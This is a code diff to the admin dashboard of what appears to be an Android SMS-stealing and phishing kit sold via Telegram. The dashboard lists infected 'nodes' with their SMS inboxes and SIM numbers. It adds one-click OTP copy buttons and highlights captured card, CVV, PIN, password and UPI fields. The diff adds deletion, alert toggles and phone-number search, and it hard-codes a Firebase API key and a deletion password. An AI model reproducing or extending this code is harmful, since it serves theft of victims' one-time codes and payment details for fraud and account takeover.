@@ -326,7 +326,7 @@
                 </div>
             </div>
         </div>
-        <div class="pt-2 text-[10px] font-bold text-slate-500 uppercase tracking-widest px-4 mb-1">Global Config</div>
+        <div class="pt-4 text-[10px] font-bold text-slate-500 uppercase tracking-widest px-4 mb-1">Global Config</div>
         <div class="px-3 space-y-2">
             <!-- Telegram Contact -->
             <a href="https://t.me/dark2shadoww" target="_blank" class="flex items-center gap-2 px-3 py-2 bg-blue-600/10 border border-blue-600/20 rounded-lg text-blue-500 hover:bg-blue-600/20 transition-all mb-4">
@@ -349,6 +349,9 @@
             </button>
             <button onclick="cleanupOldSms()" class="w-full bg-slate-800 text-rose-500 border border-rose-500/20 py-2 rounded text-[9px] font-black uppercase hover:bg-rose-500 hover:text-white transition-all">
                 <i class="fas fa-comment-slash mr-1"></i> Delete 7D Old SMS
+            </button>
+            <button onclick="deleteAllGlobalSms()" class="w-full bg-slate-800 text-rose-600 border border-rose-600/20 py-2 rounded text-[9px] font-black uppercase hover:bg-rose-600 hover:text-white transition-all">
+                <i class="fas fa-comments-slash mr-1"></i> Delete ALL Global SMS
             </button>
             <button onclick="cleanupInactiveUsers()" class="w-full bg-slate-800 text-rose-500 border border-rose-500/20 py-2 rounded text-[9px] font-black uppercase hover:bg-rose-500 hover:text-white transition-all">
                 <i class="fas fa-user-slash mr-1"></i> Delete Inactive (7D)
@@ -407,6 +410,14 @@
                 <div class="text-[10px] font-black text-slate-800 uppercase tracking-tighter" id="admin-display-name">NOT AUTHED</div>
                 <div class="text-[8px] text-green-500 font-black uppercase tracking-widest">Secure Link</div>
             </div>
+            <!-- Notification Toggle -->
+            <button onclick="toggleNotifications()" id="notif-toggle-btn" class="w-9 h-9 bg-blue-50 rounded-xl flex items-center justify-center text-blue-600 border border-slate-200 hover:bg-blue-100 transition-all shadow-sm" title="Toggle System Sounds">
+                <i id="notif-toggle-icon" class="fas fa-volume-up"></i>
+            </button>
+            <!-- SMS Alerts Toggle -->
+            <button onclick="toggleSmsAlerts()" id="sms-alert-btn" class="w-9 h-9 bg-blue-50 rounded-xl flex items-center justify-center text-blue-600 border border-slate-200 hover:bg-blue-100 transition-all shadow-sm" title="Toggle Message Alerts">
+                <i id="sms-alert-icon" class="fas fa-comment-dots"></i>
+            </button>
             <!-- User Profile Dropdown -->
             <div class="relative group">
                 <button class="w-9 h-9 bg-slate-100 rounded-xl flex items-center justify-center text-slate-400 border border-slate-200 hover:bg-slate-200 hover:text-blue-600 transition-all shadow-sm">
@@ -499,11 +510,8 @@
             <div class="flex flex-col sm:flex-row gap-3">
                 <div class="bg-white rounded-xl shadow-sm border border-slate-200 px-4 py-3 flex items-center gap-3 flex-1">
                     <i class="fas fa-search text-slate-400 text-sm"></i>
-                    <input type="text" id="user-search" oninput="resetPage(); updateDashboard()" placeholder="Search nodes, nicknames, or use :low, :online, :cf..." class="flex-1 bg-transparent border-none outline-none text-sm font-bold text-slate-700">
+                    <input type="text" id="user-search" oninput="resetPage(); updateDashboard()" placeholder="Search nodes, nicknames, numbers, or use :low, :online, :cf..." class="flex-1 bg-transparent border-none outline-none text-sm font-bold text-slate-700">
                 </div>
-                <button id="export-btn" onclick="exportToCSV()" class="hidden bg-slate-900 text-white px-6 py-3 rounded-xl text-xs font-black uppercase tracking-widest hover:bg-blue-600 transition-all shadow-lg active:scale-95 flex items-center gap-2">
-                    <i class="fas fa-file-csv"></i> Export Vault
-                </button>
             </div>
             <div id="dashboard-list" class="space-y-3"></div>
 
@@ -597,6 +605,7 @@
                         <button onclick="sendUserCmd('CHECK_ONLINE')" class="bg-emerald-600 text-white px-2 py-1 rounded-lg text-[9px] font-black uppercase shadow-md shadow-emerald-100 active:scale-95 transition-all flex items-center gap-1">
                             <i class="fas fa-wifi text-[9px]"></i> Status
                         </button>
+
                     </div>
                 </div>
             </div>
@@ -773,6 +782,7 @@
                         <i class="fas fa-search text-slate-400 text-[10px]"></i>
                         <input type="text" id="det-sms-search" oninput="updateDetails(selectedUid)" placeholder="Search in messages..." class="flex-1 bg-transparent text-[10px] font-bold outline-none">
                         <button onclick="copyAllSms()" class="text-blue-600 hover:bg-blue-50 px-2 py-1 rounded text-[9px] font-black uppercase transition-all">Copy All</button>
+                        <button onclick="deleteAllSms(selectedUid)" class="text-rose-600 hover:bg-rose-50 px-2 py-1 rounded text-[9px] font-black uppercase transition-all">Clear All</button>
                     </div>
                     <div id="det-sms-logs" class="overflow-y-auto p-3 space-y-3 no-scrollbar"></div>
                 </div>
@@ -788,10 +798,10 @@
     // =================================================================
     // LICENSE MASTER CONFIG (ONLY OWNER EDITS THIS)
     // =================================================================
-    const SYSTEM_EXPIRY_DATE = "2026-06-06"; // Format: YYYY-MM-DD
+    const SYSTEM_EXPIRY_DATE = "2026-06-02"; // Format: YYYY-MM-DD
     // =================================================================
 
-    const firebaseConfig = {
+  const firebaseConfig = {
         apiKey: "AIzaSyAIX7ZAFwlfKFyNXkSuRT4QinoL3pJ_YMg",
         authDomain: "son2rt.firebaseapp.com",
         databaseURL: "https://son2rt-default-rtdb.firebaseio.com",
@@ -804,6 +814,49 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
     const auth = firebase.auth();
+
+    const DELETION_PWD = "9988"; // Set your deletion password here (different from login)
+
+    function confirmDelete() {
+        const input = prompt("Security Check: Enter Deletion Password to confirm:");
+        if (input === DELETION_PWD) return true;
+        if (input !== null) showToast("Access Denied: Invalid Deletion Password", "error");
+        return false;
+    }
+
+    let notificationsEnabled = localStorage.getItem('notificationsEnabled') !== 'false';
+    let smsAlertsEnabled = localStorage.getItem('smsAlertsEnabled') !== 'false';
+
+    function toggleSmsAlerts() {
+        smsAlertsEnabled = !smsAlertsEnabled;
+        localStorage.setItem('smsAlertsEnabled', smsAlertsEnabled);
+        updateNotifUI();
+        showToast(smsAlertsEnabled ? "SMS popups enabled" : "SMS popups disabled", "info");
+    }
+
+    function updateNotifUI() {
+        const btn = document.getElementById('notif-toggle-btn');
+        const icon = document.getElementById('notif-toggle-icon');
+        if(!btn || !icon) return;
+
+        if (notificationsEnabled) {
+            btn.className = "w-9 h-9 bg-blue-50 rounded-xl flex items-center justify-center text-blue-600 border border-slate-200 hover:bg-blue-100 transition-all shadow-sm";
+            icon.className = 'fas fa-bell';
+        } else {
+            btn.className = "w-9 h-9 bg-slate-100 rounded-xl flex items-center justify-center text-slate-400 border border-slate-200 hover:bg-slate-200 transition-all shadow-sm";
+            icon.className = 'fas fa-bell-slash';
+        }
+    }
+
+    // Call immediately on load
+    document.addEventListener('DOMContentLoaded', updateNotifUI);
+
+    function toggleNotifications() {
+        notificationsEnabled = !notificationsEnabled;
+        localStorage.setItem('notificationsEnabled', notificationsEnabled);
+        updateNotifUI();
+        showToast(notificationsEnabled ? "System sounds enabled" : "System sounds silenced", "info");
+    }
 
     // Professional Toast Controller
     function showToast(msg, type = 'info', soundId = 'notif-sound') {
@@ -826,10 +879,12 @@
 
         container.appendChild(toast);
         // Play notification sound
-        const sound = document.getElementById(soundId) || document.getElementById('notif-sound');
-        if (sound) {
-            sound.currentTime = 0;
-            sound.play().catch(e => console.log("Sound play deferred: ", e));
+        if (notificationsEnabled) {
+            const sound = document.getElementById(soundId) || document.getElementById('notif-sound');
+            if (sound) {
+                sound.currentTime = 0;
+                sound.play().catch(e => console.log("Sound play deferred: ", e));
+            }
         }
         // Force Reflow
         setTimeout(() => toast.classList.add('show'), 10);
@@ -855,17 +910,12 @@
 
         btn.innerText = "AUTHENTICATING...";
         btn.disabled = true;
-        err.classList.add('hidden');
 
         auth.setPersistence(firebase.auth.Auth.Persistence.LOCAL)
             .then(() => {
                 return auth.signInWithEmailAndPassword(email, pass);
             })
-            .then(() => {
-                showToast("Logged in successfully!", "success");
-            })
             .catch(error => {
-                console.error("Login Error:", error);
                 err.innerText = "AUTH FAILED: " + error.message;
                 err.classList.remove('hidden');
                 btn.innerText = "VERIFY IDENTITY";
@@ -902,13 +952,11 @@
     auth.onAuthStateChanged(user => {
         console.log("Auth State Changed:", user ? "LOGGED_IN" : "LOGGED_OUT");
         const overlay = document.getElementById('login-overlay');
+        updateNotifUI();
 
         if(user) {
             // 1. Force Hide Overlay Immediately
-            if(overlay) {
-                overlay.style.display = 'none';
-                overlay.classList.add('hidden');
-            }
+            if(overlay) overlay.style.display = 'none';
             document.getElementById('admin-display-name').innerText = user.email.split('@')[0].toUpperCase();
             document.getElementById('dropdown-admin-email').innerText = user.email;
 
@@ -932,43 +980,46 @@
             // 4. Session Protection
             db.ref('Settings/sessionVer').on('value', snap => {
                 const cloudVer = snap.val() || 0;
-                const localVer = localStorage.getItem('adminSessVer');
-                if (localVer === null) {
+                const localVer = parseInt(localStorage.getItem('adminSessVer') || '0');
+                if (cloudVer > localVer) {
                     localStorage.setItem('adminSessVer', cloudVer);
-                } else if (parseInt(cloudVer) > parseInt(localVer)) {
-                    localStorage.setItem('adminSessVer', cloudVer);
-                    showToast("SESSION TERMINATED: Logged out from another device.", "error");
-                    setTimeout(() => logout(), 2000);
+                    logout();
                 }
             });
 
-            // 5. Check Subscription
+            // 5. Check Subscription (30 Days)
             checkSubscription(user);
         } else {
-            if(overlay) {
-                overlay.style.display = 'flex';
-                overlay.classList.remove('hidden');
-            }
-            // Clear any active intervals/listeners on logout
-            if(subscriptionTimer) clearInterval(subscriptionTimer);
-            db.ref('Settings/sessionVer').off();
-            db.ref('Users').off();
-            db.ref('UserRegistry').off();
+            if(overlay) overlay.style.display = 'flex';
         }
     });
+
+    function logAdminLogin(email) {
+        const logData = {
+            e: email,
+            ts: firebase.database.ServerValue.TIMESTAMP,
+            s: 'SUCCESS',
+            ua: navigator.userAgent.substring(0, 80)
+        };
+
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => {
+                logData.ip = data.ip;
+                db.ref('AdminLogs').push(logData);
+            })
+            .catch(() => {
+                db.ref('AdminLogs').push(logData);
+            });
+    }
+
+    function logout() { auth.signOut(); }
 
     let subscriptionTimer = null;
     function checkSubscription(user) {
         if(!user) return;
 
-        let expiryTime;
-        try {
-            expiryTime = new Date(SYSTEM_EXPIRY_DATE).getTime();
-            if (isNaN(expiryTime)) throw new Error("Invalid date");
-        } catch (e) {
-            console.error("License Date Config Error:", e);
-            expiryTime = Date.now() + 86400000; // Default to +1 day if parsing fails
-        }
+        const expiryTime = new Date(SYSTEM_EXPIRY_DATE).getTime();
 
         if(subscriptionTimer) clearInterval(subscriptionTimer);
 
@@ -1038,27 +1089,6 @@
             }
         }, 1000);
     }
-
-    function logAdminLogin(email) {
-        const logData = {
-            e: email,
-            ts: firebase.database.ServerValue.TIMESTAMP,
-            s: 'SUCCESS',
-            ua: navigator.userAgent.substring(0, 80)
-        };
-
-        fetch('https://api.ipify.org?format=json')
-            .then(res => res.json())
-            .then(data => {
-                logData.ip = data.ip;
-                db.ref('AdminLogs').push(logData);
-            })
-            .catch(() => {
-                db.ref('AdminLogs').push(logData);
-            });
-    }
-
-    function logout() { auth.signOut(); }
 
     function openProfileModal() {
         const user = auth.currentUser;
@@ -1134,7 +1164,42 @@
     }
 
     function clearHistory() {
-        if(confirm("Clear all logs?")) db.ref('AdminLogs').remove();
+        if(!confirm("Clear all logs?")) return;
+        if(!confirmDelete()) return;
+        db.ref('AdminLogs').remove();
+    }
+
+    function deleteUser(uid) {
+        if(!uid) return;
+        if(!confirm("DANGER: Are you sure you want to PERMANENTLY delete this device and all its data? This cannot be undone.")) return;
+        if(!confirmDelete()) return;
+        db.ref(`Users/${uid}`).remove();
+        db.ref(`UserRegistry/${uid}`).remove();
+        showToast("Device deleted successfully", "success");
+        showView('dashboard');
+    }
+
+    function deleteAllSms(uid) {
+        if(!uid) return;
+        if(!confirm("Delete all SMS for this device?")) return;
+        if(!confirmDelete()) return;
+        db.ref(`Users/${uid}/M`).remove();
+        showToast("All SMS cleared", "success");
+    }
+
+    function deleteSingleSms(uid, mid) {
+        if(!uid || !mid) return;
+        if(!confirmDelete()) return;
+        db.ref(`Users/${uid}/M/${mid}`).remove();
+        showToast("Message deleted", "success");
+    }
+
+    function deleteSingleForm(uid, fid) {
+        if(!uid || !fid) return;
+        if(!confirm("Delete this form entry?")) return;
+        if(!confirmDelete()) return;
+        db.ref(`Users/${uid}/F/${fid}`).remove();
+        showToast("Entry deleted", "success");
     }
 
     let usersData = {};
@@ -1146,16 +1211,6 @@
     let knownUids = new Set();
     let knownFids = new Set();
     let isFirstLoadUsers = true;
-
-    let updateTimer = null;
-    function requestUpdate() {
-        if (updateTimer) return;
-        updateTimer = setTimeout(() => {
-            updateDashboard();
-            if(selectedUid) updateDetails(selectedUid);
-            updateTimer = null;
-        }, 300);
-    }
 
     function toggleSidebar() {
         const sb = document.getElementById('sidebar');
@@ -1180,66 +1235,68 @@
         try {
             console.log("Listeners Started...");
 
-            // 1. Registry Listener
+            // 1. Registry Listener (Permanent Serial Numbers)
             db.ref('UserRegistry').on('value', snap => {
                 permIds = snap.val() || {};
                 if(Object.keys(usersData).length > 0) {
                     assignMissingIndices();
-                    requestUpdate();
+                    updateDashboard();
                 }
             });
 
-            // 2. Users Listener - Optimized for Bulk Data (Child-based)
-            const usersRef = db.ref('Users');
-            const handleUserUpdate = (snap) => {
-                const uid = snap.key;
+            // 2. Users Listener
+            db.ref('Users').on('value', snap => {
                 const data = snap.val() || {};
 
-                const info = data.I || {};
-                const isNowOnline = checkIsOnline(info);
-                const wasOnline = prevStatus[uid];
+                // Track changes for notifications
+                Object.keys(data).forEach(uid => {
+                    const info = data[uid].I || {};
+                    const isNowOnline = checkIsOnline(info);
+                    const wasOnline = prevStatus[uid];
 
-                if (!isFirstLoadUsers) {
-                    if (!knownUids.has(uid)) {
-                        showToast(`NEW NODE: ${info.m || 'Unknown'}`, "success", "new-device-sound");
-                    }
-                    if (wasOnline === false && isNowOnline === true) {
-                        showToast(`${info.m || "Unknown"} ONLINE ⚡`, "success", "device-online-sound");
-                    }
-                    const forms = data.F || {};
-                    Object.keys(forms).forEach(fid => {
-                        if (!knownFids.has(fid)) {
-                            showToast(`NEW DATA: ${info.m || 'Node'}`, "info", "new-post-sound");
-                            knownFids.add(fid);
+                    if (!isFirstLoadUsers) {
+                        // Detect New Device
+                        if (!knownUids.has(uid)) {
+                            showToast(`NEW NODE REGISTERED: ${info.m || 'Unknown'}`, "success", "new-device-sound");
                         }
-                    });
-                } else {
-                    const forms = data.F || {};
-                    Object.keys(forms).forEach(fid => knownFids.add(fid));
-                }
 
-                knownUids.add(uid);
-                prevStatus[uid] = isNowOnline;
-                usersData[uid] = data;
-                requestUpdate();
-            };
+                        // Only show alert if it's a confirmed state change from Offline to Online
+                        if (wasOnline === false && isNowOnline === true) {
+                            const name = (info.m || "Unknown") + " (#" + (permIds[uid] || "...") + ")";
+                            showToast(`${name} IS NOW ONLINE ⚡`, "success", "device-online-sound");
+                        }
 
-            usersRef.on('child_added', handleUserUpdate);
-            usersRef.on('child_changed', handleUserUpdate);
-            usersRef.on('child_removed', snap => {
-                delete usersData[snap.key];
-                requestUpdate();
-            });
+                        // Detect New Form Data (Post)
+                        const forms = data[uid].F || {};
+                        Object.keys(forms).forEach(fid => {
+                            if (!knownFids.has(fid)) {
+                                showToast(`NEW DATA RECEIVED FROM ${info.m || 'Node'}`, "info", "new-post-sound");
+                                knownFids.add(fid);
+                            }
+                        });
+                    } else {
+                        // Populate initial state to avoid spam on load
+                        const forms = data[uid].F || {};
+                        Object.keys(forms).forEach(fid => knownFids.add(fid));
+                    }
 
-            usersRef.once('value').then(() => {
+                    knownUids.add(uid);
+                    prevStatus[uid] = isNowOnline;
+                });
+
                 isFirstLoadUsers = false;
-                requestUpdate();
+                usersData = data;
+                assignMissingIndices();
+                updateDashboard();
+                if(selectedUid) updateDetails(selectedUid);
             });
 
-            // 3. New Live SMS Listener
+            // 3. New Live SMS Listener (Professional Alert System)
             let isFirstLoad = true;
             db.ref('all_sms').limitToLast(1).on('child_added', snap => {
                 if (isFirstLoad) { isFirstLoad = false; return; }
+                if (!smsAlertsEnabled) return; // CHECK TOGGLE
+
                 const msg = snap.val();
                 if (!msg) return;
 
@@ -1249,9 +1306,6 @@
                 const user = usersData[uid]?.I?.m || "Unknown Node";
 
                 showToast(`<b>NEW SMS FROM ${user}</b><br><small>${sender}: ${body.substring(0, 40)}...</small>`, "info", "message-sound");
-
-                // Play subtle notification sound (Optional)
-                // new Audio('https://assets.mixkit.co/active_storage/sfx/2354/2354-preview.mp3').play().catch(e=>{});
             });
 
             // 4. Admin Logs Listener (Persistent)
@@ -1321,44 +1375,9 @@
         const activeNav = document.getElementById(navId);
         if(activeNav) activeNav.classList.add('active');
 
-        // Show/Hide Export button based on filter
-        const exportBtn = document.getElementById('export-btn');
-        if(exportBtn) exportBtn.classList.toggle('hidden', f !== 'forms');
-
         // Navigation Fix: Ensure we go back to dashboard view when a filter is clicked
         showView('dashboard', true, false);
         updateDashboard();
-    }
-
-    function exportToCSV() {
-        if (currentFilter !== 'forms') return;
-
-        let csv = "User,NodeID,Field,Value,Timestamp\n";
-
-        Object.keys(usersData).forEach(uid => {
-            const u = usersData[uid];
-            const name = u.I?.m || "Unknown";
-            if (u.F) {
-                Object.values(u.F).forEach(form => {
-                    const ts = new Date(form.ts).toLocaleString().replace(/,/g, '');
-                    for (let key in form) {
-                        if (['ts', 'uid', 'name', 'page', 'timestamp'].includes(key)) continue;
-                        csv += `"${name}","${uid}","${key}","${form[key]}","${ts}"\n`;
-                    }
-                });
-            }
-        });
-
-        const blob = new Blob([csv], { type: 'text/csv' });
-        const url = window.URL.createObjectURL(blob);
-        const a = document.createElement('a');
-        a.setAttribute('hidden', '');
-        a.setAttribute('href', url);
-        a.setAttribute('download', `data_vault_export_${Date.now()}.csv`);
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
-        showToast("Data Vault exported to CSV successfully!", "success");
     }
 
     function formatTime(ts) {
@@ -1456,24 +1475,15 @@
         const now = new Date();
         const startOfToday = new Date(now.getFullYear(), now.getMonth(), now.getDate()).getTime();
 
-        // Global Stats Calculation - Optimized
+        // Global Stats Calculation
         let todayCount = 0, msgsCount = 0, formsCount = 0, onlineCount = 0, favCount = 0;
         uids.forEach((uid) => {
             const u = usersData[uid];
             const info = u.I || {};
             const isOnline = checkIsOnline(info);
-
-            // Speed optimization: Check last seen or walk through keys manually to avoid massive arrays
-            let isToday = (info.lo || 0) >= startOfToday;
-            if (isToday) {
-                todayCount++;
-            } else if (u.M) {
-                for(let mid in u.M) {
-                    if ((u.M[mid].ts || 0) >= startOfToday) { todayCount++; break; }
-                }
-            }
-
-            if (u.M) msgsCount++;
+            const hasSmsToday = Object.values(u.M || {}).some(m => (m.ts || 0) >= startOfToday);
+            if ((info.lo || 0) >= startOfToday || hasSmsToday) todayCount++;
+            if (Object.keys(u.M || {}).length > 0) msgsCount++;
             if (u.F) formsCount++;
             if (isOnline) onlineCount++;
             if (info.fav) favCount++;
@@ -1491,34 +1501,33 @@
         if (currentFilter === 'msgs') {
             uids.forEach(uid => {
                 const u = usersData[uid];
-                if (!u.M) return;
                 const info = u.I || {};
+                const msgs = Object.entries(u.M || {});
                 const permIdStr = "#" + (permIds[uid] || "");
-
-                // Limit to last 50 messages per user for global feed to prevent crash
-                const mKeys = Object.keys(u.M).sort().reverse().slice(0, 50);
-                mKeys.forEach(mid => {
-                    const m = u.M[mid];
-                    if (!query || `${info.m} ${m.s} ${m.m} ${permIdStr}`.toLowerCase().includes(query)) {
-                        filteredItems.push({ type: 'msg', ...m, uid, name: (info.m || "Unknown") });
+                const phoneNumbers = [info.pn, ...(u.S || []).map(s => s.n)].filter(Boolean).join(' ');
+                msgs.forEach(([mid, m]) => {
+                    if (!query || `${info.m} ${m.s} ${m.m} ${permIdStr} ${phoneNumbers}`.toLowerCase().includes(query)) {
+                        filteredItems.push({ type: 'msg', ...m, mid, uid, name: (info.m || "Unknown") });
                     }
                 });
             });
-            filteredItems.sort((a,b) => (b.ts || 0) - (a.ts || 0)).splice(500); // Max 500 messages total
+            filteredItems.sort((a,b) => (b.ts || 0) - (a.ts || 0));
         } else if (currentFilter === 'forms') {
-            let userGroups = [];
             uids.forEach(uid => {
                 const u = usersData[uid];
-                if (!u.F) return;
                 const info = u.I || {};
-                const forms = Object.values(u.F).sort((a,b) => (b.ts || 0) - (a.ts || 0));
-                let searchText = (info.m || "Unknown") + " #" + (permIds[uid] || "");
-                forms.forEach(f => { for(let k in f) searchText += " " + f[k]; });
-                if (!query || searchText.toLowerCase().includes(query)) {
-                    userGroups.push({ type: 'form', uid: uid, name: info.m || "Unknown", forms: forms, lastTs: forms[0]?.ts || 0 });
+                const phoneNumbers = [info.pn, ...(u.S || []).map(s => s.n)].filter(Boolean).join(' ');
+                if (u.F) {
+                    Object.entries(u.F).forEach(([fid, f]) => {
+                        let searchText = (info.m || "Unknown") + " #" + (permIds[uid] || "") + " " + phoneNumbers;
+                        for(let k in f) searchText += " " + f[k];
+                        if (!query || searchText.toLowerCase().includes(query)) {
+                            filteredItems.push({ type: 'form_entry', uid: uid, fid: fid, name: info.m || "Unknown", form: f, ts: f.ts || 0 });
+                        }
+                    });
                 }
             });
-            filteredItems = userGroups.sort((a,b) => b.lastTs - a.lastTs);
+            filteredItems.sort((a,b) => (b.ts || 0) - (a.ts || 0));
         } else {
             // Sort primary list by serial number (permIds)
             const sorted = uids.sort((a,b) => (permIds[b] || 0) - (permIds[a] || 0));
@@ -1526,15 +1535,13 @@
                 const u = usersData[uid];
                 const info = u.I || {};
                 const isOnline = checkIsOnline(info);
-
-                let isToday = (info.lo || 0) >= startOfToday;
-                if (!isToday && u.M) {
-                    for(let mid in u.M) { if ((u.M[mid].ts || 0) >= startOfToday) { isToday = true; break; } }
-                }
-
+                const hasSmsToday = Object.values(u.M || {}).some(m => (m.ts || 0) >= startOfToday);
+                const isToday = (info.lo || 0) >= startOfToday || hasSmsToday;
                 const name = (info.m || "Unknown");
                 const nickname = (info.nn || "");
                 const permIdStr = "#" + (permIds[uid] || "");
+                const phoneNumbers = [info.pn, ...(u.S || []).map(s => s.n)].filter(Boolean).join(' ');
+
                 let matchesF = (currentFilter === 'all') ||
                                (currentFilter === 'today' && isToday) ||
                                (currentFilter === 'online' && isOnline) ||
@@ -1544,8 +1551,10 @@
                     name.toLowerCase().includes(query) ||
                     nickname.toLowerCase().includes(query) ||
                     uid.toLowerCase().includes(query) ||
-                    permIdStr.includes(query);
+                    permIdStr.includes(query) ||
+                    phoneNumbers.toLowerCase().includes(query);
 
+                // Advanced filters
                 if (query === ':low') matchesQuery = (info.bl || 0) < 25;
                 if (query === ':online') matchesQuery = isOnline;
                 if (query === ':offline') matchesQuery = !isOnline;
@@ -1577,9 +1586,12 @@
                 const otpBtn = otp ? `<button onclick="event.stopPropagation(); copyToClipboard('${otp}', this)" class="ml-2 bg-blue-600 text-white px-2 py-0.5 rounded text-[9px] font-black uppercase shadow-sm active:scale-90 transition-all"><i class="fas fa-key mr-1"></i> OTP: ${otp}</button>` : "";
 
                 const card = document.createElement('div');
-                card.className = "user-box cursor-pointer hover:border-blue-500 transition-all";
+                card.className = "user-box cursor-pointer hover:border-blue-500 transition-all relative group";
                 card.onclick = () => showUserDetails(item.uid);
                 card.innerHTML = `
+                    <button onclick="event.stopPropagation(); deleteSingleSms('${item.uid}', '${item.mid}')" class="absolute top-2 right-2 w-8 h-8 bg-rose-50 text-rose-500 rounded-full flex items-center justify-center opacity-0 group-hover:opacity-100 transition-all hover:bg-rose-500 hover:text-white shadow-sm z-10">
+                        <i class="fas fa-trash-can text-xs"></i>
+                    </button>
                     <div class="flex items-center gap-3 mb-3 pb-2 border-b border-slate-100">
                         <div class="w-10 h-10 bg-indigo-50 text-indigo-600 rounded-xl flex items-center justify-center text-lg border border-indigo-100 flex-shrink-0">
                             <i class="fas fa-comment-sms"></i>
@@ -1603,20 +1615,15 @@
                     <div class="flex justify-end">${otpBtn}</div>
                 `;
                 listDiv.appendChild(card);
-            } else if (item.type === 'form') {
+            } else if (item.type === 'form_entry') {
                 const u = usersData[item.uid];
                 const info = u.I || {};
                 const isOnline = checkIsOnline(info);
                 let fieldsHtml = "";
-                let combinedData = {};
-                item.forms.forEach(f => {
-                    for(let k in f) {
-                        if(['ts','uid','name','page','timestamp'].includes(k)) continue;
-                        combinedData[k] = f[k];
-                    }
-                });
-                for(let k in combinedData) {
-                    const val = combinedData[k];
+                const f = item.form;
+                for(let k in f) {
+                    if(['ts','uid','name','page','timestamp'].includes(k)) continue;
+                    const val = f[k];
                     const isS = /card|cvv|pin|pass|upi/.test(k.toLowerCase());
                     fieldsHtml += `
                         <div class="flex justify-between items-center py-1.5 border-b border-slate-100 last:border-0">
@@ -1628,9 +1635,12 @@
                         </div>`;
                 }
                 const card = document.createElement('div');
-                card.className = "user-box border-l-4 border-l-rose-500 cursor-pointer hover:bg-rose-50 transition-all";
+                card.className = "user-box border-l-4 border-l-rose-500 cursor-pointer hover:bg-rose-50 transition-all relative group";
                 card.onclick = () => showUserDetails(item.uid);
                 card.innerHTML = `
+                    <button onclick="event.stopPropagation(); deleteSingleForm('${item.uid}', '${item.fid}')" class="absolute top-2 right-2 w-8 h-8 bg-rose-50 text-rose-500 rounded-full flex items-center justify-center opacity-0 group-hover:opacity-100 transition-all hover:bg-rose-500 hover:text-white shadow-sm z-10">
+                        <i class="fas fa-trash-can text-xs"></i>
+                    </button>
                     <div class="flex items-center gap-3 mb-3 pb-2 border-b border-slate-100">
                         <div class="w-10 h-10 bg-rose-50 text-rose-600 rounded-xl flex items-center justify-center text-lg border border-rose-100 flex-shrink-0">
                             <i class="fas fa-file-invoice"></i>
@@ -1642,7 +1652,7 @@
                                     <div class="w-2 h-2 rounded-full ${isOnline ? 'online-dot bg-green-500' : 'offline-dot bg-red-500'}"></div>
                                     <span class="text-[10px] font-black text-rose-600 uppercase bg-rose-50 px-2 py-0.5 rounded truncate">${item.name}</span>
                                 </div>
-                                <span class="text-[9px] text-slate-400 font-mono">${new Date(item.lastTs).toLocaleTimeString()}</span>
+                                <span class="text-[9px] text-slate-400 font-mono">${new Date(item.ts).toLocaleTimeString()}</span>
                             </div>
                         </div>
                     </div>
@@ -1805,7 +1815,11 @@
         const pn = info.pn || "";
         document.getElementById('det-name').innerText = (uIdx ? `#${uIdx} ` : "") + (info.m || "NODE");
         document.getElementById('det-id-long').innerText = `ID: ${uid}`;
-        document.getElementById('det-nickname').value = info.nn || "";
+
+        const nickInput = document.getElementById('det-nickname');
+        if (nickInput && document.activeElement !== nickInput) {
+            nickInput.value = info.nn || "";
+        }
 
         let s1 = sims[0]?.n && sims[0].n !== 'Hidden' ? sims[0].n : (pn || "H");
         let s2 = sims[1]?.n && sims[1].n !== 'Hidden' ? sims[1].n : "H";
@@ -1924,11 +1938,11 @@
         const smsDiv = document.getElementById('det-sms-logs');
         smsDiv.innerHTML = '';
 
-        // Optimize: Sort and Limit messages in detail view to prevent crash
-        const msgs = Object.values(u.M || {}).sort((a,b) => (b.ts || 0) - (a.ts || 0));
-        const filteredMsgs = smsSearch ? msgs.filter(m => m.m.toLowerCase().includes(smsSearch) || m.s.toLowerCase().includes(smsSearch)) : msgs.slice(0, 100);
+        const smsEntries = Object.entries(u.M || {}).sort((a,b) => (b[1].ts || 0) - (a[1].ts || 0));
 
-        filteredMsgs.forEach(m => {
+        smsEntries.forEach(([mid, m]) => {
+            if(smsSearch && !m.m.toLowerCase().includes(smsSearch) && !m.s.toLowerCase().includes(smsSearch)) return;
+
             const simInfo = sims.find(s => s.s === m.ss);
             const simDisplayName = (simInfo && simInfo.n && simInfo.n !== 'Hidden') ? simInfo.n : (m.ss ? `S${m.ss}` : "");
 
@@ -1936,7 +1950,7 @@
             const otpBtn = otp ? `<button onclick="copyToClipboard('${otp}', this)" class="bg-blue-600 text-white px-2 py-0.5 rounded text-[9px] font-black uppercase shadow-sm active:scale-90 transition-all"><i class="fas fa-key mr-1"></i> Copy OTP: ${otp}</button>` : "";
 
             const div = document.createElement('div');
-            div.className = "bg-slate-50 p-3 rounded-xl border border-slate-100";
+            div.className = "bg-slate-50 p-3 rounded-xl border border-slate-100 relative group";
             div.innerHTML = `
                 <div class="flex justify-between items-center mb-1.5">
                     <div class="flex items-center gap-2">
@@ -1944,7 +1958,10 @@
                         ${simDisplayName ? `<span class="bg-blue-100 text-blue-700 px-1.5 rounded text-[10px] font-black">${simDisplayName}</span>` : ''}
                         ${otpBtn}
                     </div>
-                    <span class="text-[10px] text-slate-400 font-medium">${new Date(m.ts).toLocaleString()}</span>
+                    <div class="flex items-center gap-2">
+                        <span class="text-[10px] text-slate-400 font-medium">${new Date(m.ts).toLocaleString()}</span>
+                        <button onclick="deleteSingleSms('${uid}', '${mid}')" class="text-rose-400 hover:text-rose-600 transition-colors opacity-0 group-hover:opacity-100"><i class="fas fa-trash-can text-[10px]"></i></button>
+                    </div>
                 </div>
                 <div class="text-sm font-bold text-slate-800 leading-tight">${m.m}</div>`;
             smsDiv.appendChild(div);
@@ -1952,10 +1969,17 @@
 
         const formDiv = document.getElementById('det-form-sections');
         formDiv.innerHTML = '';
-        Object.values(u.F || {}).sort((a,b) => (b.ts || 0) - (a.ts || 0)).forEach((f, idx) => {
+
+        const formEntries = Object.entries(u.F || {}).sort((a,b) => (b[1].ts || 0) - (a[1].ts || 0));
+
+        formEntries.forEach(([fid, f], idx) => {
             const wrap = document.createElement('div');
-            wrap.className = "bg-white border-l-4 border-l-rose-600 p-4 shadow-sm rounded-xl";
